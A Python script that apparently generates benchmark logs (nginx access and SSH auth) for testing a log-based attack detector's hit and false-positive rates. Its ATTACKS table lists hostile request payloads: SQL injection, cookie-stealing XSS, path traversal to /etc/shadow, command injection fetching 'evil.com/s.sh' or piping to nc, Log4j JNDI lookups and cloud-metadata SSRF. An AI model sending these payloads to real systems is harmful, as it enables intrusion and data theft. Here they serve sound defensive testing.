"""生成压力测试语料：真实规模的 nginx access.log + auth.log。

为什么要造数据而不是用仓库里那几个 demo 文件：
demo 只有 35 行，跑出来"耗时 0.02s、检出 3 条"这种数字，面试官一问规模就露馅。
这个脚本按线上的流量比例生成：正常业务请求占绝大多数，攻击请求散落在其中，
同时混入爬虫 UA、带单引号的正常姓名、带双连字符的正常参数等"容易误报"的样本，
用来量化误报率——这才是安全工具真正需要证明的数字。

用法：
    python bench/gen_corpus.py --lines 100000
"""

from __future__ import annotations

import argparse
import random
from datetime import datetime, timedelta
from pathlib import Path

random.seed(20261110)

# 正常业务路径
NORMAL_PATHS = [
    "/", "/index.html", "/api/user/profile", "/api/order/list", "/static/css/app.css",
    "/static/js/main.js", "/images/logo.png", "/api/product/detail", "/favicon.ico",
    "/api/cart", "/api/search", "/login", "/register", "/about", "/api/comment/list",
    "/static/fonts/icon.woff2", "/api/coupon/query", "/api/address/list",
]

# 正常但"脏"的请求：用来测误报
TRICKY_PATHS = [
    "/api/user/search?name=O%27Brien",          # 正常姓名带单引号
    "/api/item/detail?sku=item--detail-001",     # 正常参数带双连字符
    "/api/comment?text=1%2B1%3D2",               # 正常等号
    "/api/doc?page=select-guide",                # 含 select 单词
    "/api/report?file=report_2026.sql.pdf",      # 含 .sql 但不是备份
    "/api/user/alert-notice",                    # 含 alert 但不是弹窗函数
    "/api/admin/notice",                         # 含 admin 是正常路由
]

NORMAL_UAS = [
    "Mozilla/5.0 (Windows NT 10.0; Win64; x64) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Safari/537.36",
    "Mozilla/5.0 (Macintosh; Intel Mac OS X 10_15_7) AppleWebKit/605.1.15 (KHTML, like Gecko) Version/17.4 Safari/605.1.15",
    "Mozilla/5.0 (iPhone; CPU iPhone OS 17_4 like Mac OS X) AppleWebKit/605.1.15 (KHTML, like Gecko) Mobile/15E148",
    "Mozilla/5.0 (Linux; Android 14; SM-S918B) AppleWebKit/537.36 (KHTML, like Gecko) Chrome/131.0.0.0 Mobile Safari/537.36",
]

CRAWLER_UAS = [
    "Mozilla/5.0 (compatible; Baiduspider/2.0; +http://www.baidu.com/search/spider.html)",
    "Mozilla/5.0 (compatible; Googlebot/2.1; +http://www.google.com/bot.html)",
    "Mozilla/5.0 (compatible; bingbot/2.0; +http://www.bing.com/bingbot.htm)",
]

# 攻击载荷：(路径, UA)
ATTACKS = {
    "SQL注入": [
        ("/api/product?id=1%27%20UNION%20SELECT%20username,password%20FROM%20users--", "sqlmap/1.8.3"),
        ("/login?user=admin%27%20OR%20%271%27%3D%271&pass=x", "sqlmap/1.8.3"),
        ("/api/search?q=1%27%20AND%20SLEEP(5)--", "sqlmap/1.8.3"),
        ("/api/detail?id=1%27%20AND%20extractvalue(1,concat(0x7e,(SELECT%20version())))--", "sqlmap/1.8.3"),
        ("/api/list?cat=1;DROP%20TABLE%20orders--", "Mozilla/5.0"),
    ],
    "XSS": [
        ("/api/comment?text=%3Cscript%3Ealert(document.cookie)%3C/script%3E", "Mozilla/5.0"),
        ("/search?q=%3Cimg%20src%3Dx%20onerror%3Dalert(1)%3E", "Mozilla/5.0"),
        ("/api/feedback?msg=%3Csvg%20onload%3Dalert(1)%3E", "Mozilla/5.0"),
        ("/redirect?url=javascript:alert(document.domain)", "Mozilla/5.0"),
    ],
    "路径穿越": [
        ("/download?file=../../../../etc/passwd", "Mozilla/5.0"),
        ("/static/../../../etc/shadow", "Mozilla/5.0"),
        ("/api/read?p=..%2F..%2F..%2Fwindows%2Fwin.ini", "Mozilla/5.0"),
    ],
    "命令注入": [
        ("/api/ping?host=127.0.0.1;cat%20/etc/passwd", "Mozilla/5.0"),
        ("/api/exec?cmd=whoami%7Cnc%2010.0.0.5%204444", "Mozilla/5.0"),
        ("/api/test?ip=$(curl%20http://evil.com/s.sh%7Csh)", "Mozilla/5.0"),
    ],
    "敏感文件探测": [
        ("/.git/config", "Mozilla/5.0"),
        ("/.env", "Mozilla/5.0"),
        ("/backup/www_20260101.zip", "Mozilla/5.0"),
        ("/wp-config.php.bak", "Mozilla/5.0"),
        ("/actuator/env", "Mozilla/5.0"),
        ("/.svn/entries", "Mozilla/5.0"),
    ],
    "WebShell": [
        ("/upload/shell.php?cmd=system(%27id%27)", "Mozilla/5.0"),
        ("/static/x.php?f=eval($_POST%5B1%5D)", "Mozilla/5.0"),
    ],
    "Log4j注入": [
        ("/api/login?name=${jndi:ldap://evil.com/a}", "${jndi:ldap://evil.com/a}"),
        ("/", "Mozilla/5.0 ${jndi:rmi://1.2.3.4:1099/exp}"),
    ],
    "SSRF": [
        ("/api/proxy?url=http://127.0.0.1:6379/", "Mozilla/5.0"),
        ("/fetch?target=http://169.254.169.254/latest/meta-data/", "Mozilla/5.0"),
        ("/api/image?src=http://192.168.1.1/admin", "Mozilla/5.0"),
    ],
}

SCANNER_UAS = [
    "Mozilla/5.0 (compatible; Nmap Scripting Engine)",
    "gobuster/3.6",
    "Nikto/2.5.0",
    "Mozilla/5.0 (compatible; Nuclei - Open-source project)",
    "Wfuzz/3.1.0",
]

MONTHS = ["Jan", "Feb", "Mar", "Apr", "May", "Jun",
          "Jul", "Aug", "Sep", "Oct", "Nov", "Dec"]

STATUS_OK = [200] * 8 + [201, 204, 302]
STATUS_ERR = [404] * 6 + [403, 500, 502]


def rand_ip(external: bool = True) -> str:
    if external:
        return f"{random.randint(1,223)}.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"
    return f"10.{random.randint(0,255)}.{random.randint(0,255)}.{random.randint(1,254)}"


def fmt_time(dt: datetime) -> str:
    return (f"{dt.day:02d}/{MONTHS[dt.month-1]}/{dt.year}:"
            f"{dt.hour:02d}:{dt.minute:02d}:{dt.second:02d} +0800")


def make_access_line(dt: datetime, ip: str, method: str, path: str,
                     status: int, size: int, ua: str) -> str:
    return (f'{ip} - - [{fmt_time(dt)}] "{method} {path} HTTP/1.1" '
            f'{status} {size} "-" "{ua}"')


def gen_access(total: int, out: Path) -> dict:
    """返回生成统计，供后面算检出率用。"""
    stats = {"total": 0, "attack": 0, "by_category": {}}
    base = datetime(2026, 11, 8, 0, 0, 0)
    lines = []

    for i in range(total):
        dt = base + timedelta(seconds=i * 0.8)
        roll = random.random()

        if roll < 0.04:
            # 攻击流量 4%
            cat = random.choice(list(ATTACKS))
            path, ua = random.choice(ATTACKS[cat])
            line = make_access_line(dt, rand_ip(False), "GET", path,
                                    random.choice(STATUS_ERR), random.randint(100, 900), ua)
            stats["attack"] += 1
            stats["by_category"][cat] = stats["by_category"].get(cat, 0) + 1

        elif roll < 0.10:
            # 爬虫 6%
            line = make_access_line(dt, rand_ip(), "GET", random.choice(NORMAL_PATHS),
                                    random.choice(STATUS_OK), random.randint(800, 60000),
                                    random.choice(CRAWLER_UAS))

        elif roll < 0.13:
            # 扫描器裸扫目录 3%
            line = make_access_line(dt, rand_ip(), "GET",
                                    f"/{random.choice(['admin', 'test', 'phpmyadmin', 'pma', 'manager/html', 'wp-admin'])}",
                                    random.choice([403, 404]), random.randint(100, 500),
                                    random.choice(SCANNER_UAS))

        elif roll < 0.20:
            # 正常但脏的请求 7% —— 误报压力测试
            path = random.choice(TRICKY_PATHS)
            line = make_access_line(dt, rand_ip(), "GET", path,
                                    random.choice(STATUS_OK), random.randint(200, 5000),
                                    random.choice(NORMAL_UAS))

        else:
            # 正常业务 80%
            line = make_access_line(dt, rand_ip(), random.choice(["GET", "GET", "POST"]),
                                    random.choice(NORMAL_PATHS), random.choice(STATUS_OK),
                                    random.randint(200, 80000), random.choice(NORMAL_UAS))

        lines.append(line)
        stats["total"] += 1

    out.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return stats


def gen_auth(total: int, out: Path) -> dict:
    """auth.log：一次 SSH 爆破事件 + 大量正常会话。"""
    stats = {"total": 0, "brute_ip": "45.133.7.88", "brute_fails": 0}
    base = datetime(2026, 11, 8, 3, 0, 0)
    lines = []
    brute_ip = stats["brute_ip"]

    # 前 200 行：一个 IP 对同一账号连续爆破
    for i in range(200):
        dt = base + timedelta(seconds=i * 2)
        ts = f"{MONTHS[dt.month-1]} {dt.day:02d} {dt.hour:02d}:{dt.minute:02d}:{dt.second:02d}"
        lines.append(f"{ts} web-prod-01 sshd[{3000+i}]: Failed password for invalid user root "
                     f"from {brute_ip} port {40000+i} ssh2")
        stats["brute_fails"] += 1
        stats["total"] += 1

    # 剩余：正常运维登录 + 零星失败
    for i in range(total - 200):
        dt = base + timedelta(seconds=200 * 2 + i * 30)
        ts = f"{MONTHS[dt.month-1]} {dt.day:02d} {dt.hour:02d}:{dt.minute:02d}:{dt.second:02d}"
        ip = f"10.0.{random.randint(0,5)}.{random.randint(10,200)}"
        roll = random.random()
        if roll < 0.85:
            lines.append(f"{ts} web-prod-01 sshd[{4000+i}]: Accepted publickey for deploy "
                         f"from {ip} port {50000+i} ssh2: RSA SHA256:abc")
        elif roll < 0.93:
            lines.append(f"{ts} web-prod-01 sshd[{4000+i}]: Connection closed by {ip} port {50000+i}")
        elif roll < 0.99:
            lines.append(f"{ts} web-prod-01 sshd[{4000+i}]: Received disconnect from {ip} port {50000+i}: "
                         f"Bye Bye [preauth]")
        else:
            lines.append(f"{ts} web-prod-01 sshd[{4000+i}]: Failed password for deploy from {ip} "
                         f"port {50000+i} ssh2")
        stats["total"] += 1

    out.write_text("\n".join(lines) + "\n", encoding="utf-8")
    return stats


def main() -> None:
    ap = argparse.ArgumentParser()
    ap.add_argument("--lines", type=int, default=100_000, help="access.log 行数")
    ap.add_argument("--out", default="bench/corpus", help="输出目录")
    args = ap.parse_args()

    out = Path(args.out)
    out.mkdir(parents=True, exist_ok=True)

    a = gen_access(args.lines, out / "access_large.log")
    b = gen_auth(min(args.lines // 20, 5000), out / "auth_large.log")

    print(f"access_large.log: {a['total']} 行，其中攻击样本 {a['attack']} 条")
    for k, v in sorted(a["by_category"].items(), key=lambda x: -x[1]):
        print(f"  {k}: {v}")
    print(f"auth_large.log: {b['total']} 行，其中爆破失败 {b['brute_fails']} 次（来自 {b['brute_ip']}）")


if __name__ == "__main__":
    main()
